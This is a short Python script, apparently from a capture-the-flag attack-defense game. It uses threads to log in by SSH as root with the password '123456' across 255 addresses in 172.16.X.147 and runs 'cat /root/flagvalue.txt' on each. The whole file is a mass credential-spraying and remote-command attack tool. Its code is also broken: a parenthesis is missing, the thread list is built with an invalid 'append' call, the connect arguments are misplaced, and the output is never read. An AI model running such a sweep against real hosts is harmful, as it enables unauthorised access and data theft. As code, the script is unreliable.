import os
import paramiko
import threading 
def ssh2(host,user,password,cmd):
	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host,user,password,timeout=3)
		stdin,stdout,stderr = ssh.exec_command(cmd)
		#stdin.write("Y")
		ssh.close()
	except:
		pass 
		

def main():
	
	targets_cmd = "cat /root/flagvalue.txt"
	targets_user = "root"
	targets_password = "123456"
	#os.sys.argv[1]
	threads = []

	for i in range(255):
		targets_host = "172.16.%s.147" % i
		s = threading.Thread(target=ssh2,args=(targets_host,targets_user,targets_password,targets_cmd)
		threads = append(s)

	for i in range(255):
		threads[i].start()

	for i in range(255):
		threads[i].join()

main()
	